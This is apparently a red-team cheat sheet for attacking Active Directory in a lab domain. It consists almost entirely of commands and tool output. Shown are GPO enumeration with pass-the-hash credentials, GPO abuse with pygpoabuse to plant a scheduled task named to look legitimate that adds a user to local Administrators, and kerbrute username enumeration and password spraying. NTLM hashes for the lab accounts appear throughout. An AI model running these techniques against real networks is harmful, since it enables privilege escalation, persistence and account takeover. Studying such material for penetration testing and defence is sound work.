# ADDS General

## GPO

### Enum

```bash
python3 pywerview.py get-netgpo \
-u 'DESKTOP-MW01$' \
--hashes ':019c883860ff799e7ea86e31920457e7' \
--dc-ip 192.168.1.12
# ...
# objectclass:              top, container, groupPolicyContainer
# cn:                       {F947F715-0CC7-4A7A-B615-D4C38F6E46B0}
# distinguishedname:        CN={F947F715-0CC7-4A7A-B615-D4C38F6E46B0},CN=Policies,CN=System,DC=sales,DC=contoso,DC=lab
# instancetype:             4
# displayname:              Deploy Sysmon
# usncreated:               71204
# usnchanged:               71211
# showinadvancedviewonly:   True
# name:                     {F947F715-0CC7-4A7A-B615-D4C38F6E46B0}
# objectguid:               {30a4df9d-1a8e-4584-ac8c-46e235a95e24}
# flags:                    0
# versionnumber:            1
# objectcategory:           CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=contoso,DC=lab
# gpcfunctionalityversion:  2
# gpcfilesyspath:           \\sales.contoso.lab\SysVol\sales.contoso.lab\Policies\{F947F715-0CC7-4A7A-B615-D4C38F6E46B0}
# gpcmachineextensionnames: [{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]
# dscorepropagationdata:    1601-01-01 00:00:00+00:00
# ...

python3 pywerview.py get-netou \
-u 'DESKTOP-MW01$' \
--hashes ':019c883860ff799e7ea86e31920457e7' \
--dc-ip 192.168.1.12 \
--guid 'F947F715-0CC7-4A7A-B615-D4C38F6E46B0'
# distinguishedname: OU=Machines,DC=sales,DC=contoso,DC=lab
```

### Execution via GPO write

```bash
python3 pywerview.py get-netgpo \
-u 'lmodifr' \
--hashes ':f28e11d87d14a00396ea087f74e460c5' \
--dc-ip 192.168.1.12
# objectclass:             top, container, groupPolicyContainer
# cn:                      {D22722CD-4F22-4853-AB0F-FA6F09AB9E50}
# distinguishedname:       CN={D22722CD-4F22-4853-AB0F-FA6F09AB9E50},CN=Policies,CN=System,DC=sales,DC=contoso,DC=lab
# instancetype:            4
# whencreated:             2026-05-05 13:44:58+00:00
# whenchanged:             2026-05-05 13:44:58+00:00
# displayname:             Test GPO
# usncreated:              167712
# usnchanged:              167717
# showinadvancedviewonly:  True
# name:                    {D22722CD-4F22-4853-AB0F-FA6F09AB9E50}
# objectguid:              {91582538-c9c7-4adc-8f82-e561a1a94d5b}
# flags:                   0
# versionnumber:           0
# objectcategory:          CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=contoso,DC=lab
# gpcfunctionalityversion: 2
# gpcfilesyspath:          \\sales.contoso.lab\SysVol\sales.contoso.lab\Policies\{D22722CD-4F22-4853-AB0F-FA6F09AB9E50}
# dscorepropagationdata:   1601-01-01 00:00:00+00:00

python3 pywerview.py get-netou \
-u 'lmodifr' \
--hashes ':f28e11d87d14a00396ea087f74e460c5' \
--dc-ip 192.168.1.12 \
--guid 'D22722CD-4F22-4853-AB0F-FA6F09AB9E50'
# distinguishedname: OU=Machines,DC=sales,DC=contoso,DC=lab

python3 pygpoabuse.py 'sales.contoso.lab/lmodifr' \
-dc-ip '192.168.1.12' \
-hashes ':f28e11d87d14a00396ea087f74e460c5' \
-gpo-name 'Test GPO' \
-command 'net localgroup Administrators SALES\lmodifr /add' \
-taskname 'Legit task'
# SUCCESS:root:ScheduledTask Legit task created!
# [+] ScheduledTask Legit task created!

python3 pygpoabuse.py 'sales.contoso.lab/lmodifr' \
-dc-ip '192.168.1.12' \
-hashes ':f28e11d87d14a00396ea087f74e460c5' \
-gpo-name 'Test GPO' \
-command 'net localgroup Administrators SALES\lmodifr /add' \
-taskname 'Legit task' \
--cleanup
```

## Spray

### Execution

```bash
# abuse KDC_ERR_C_PRINCIPAL_UNKNOWN
kerbrute_linux_amd64 userenum -d sales.contoso.lab --dc 192.168.1.12 usernames.txt
# Version: v1.0.3 (9dad6e1) - 04/24/26 - Ronnie Flathers @ropnop
# 
# 2026/04/24 12:35:46 >  Using KDC(s):
# 2026/04/24 12:35:46 >   192.168.1.12:88
# 
# 2026/04/24 12:35:46 >  [+] VALID USERNAME:       alice@sales.contoso.lab
# 2026/04/24 12:35:46 >  Done! Tested 3 usernames (1 valid) in 0.002 seconds

# spray
kerbrute_linux_amd64 passwordspray -d sales.contoso.lab --dc 192.168.1.12 usernames.txt '1AM4l1c3!?'
# Version: v1.0.3 (9dad6e1) - 04/24/26 - Ronnie Flathers @ropnop
# 
# 2026/04/24 12:37:06 >  Using KDC(s):
# 2026/04/24 12:37:06 >   192.168.1.12:88
# 
# 2026/04/24 12:37:06 >  [+] VALID LOGIN:  alice@sales.contoso.lab:1AM4l1c3!?
# 2026/04/24 12:37:06 >  Done! Tested 3 logins (1 successes) in 0.009 seconds
```
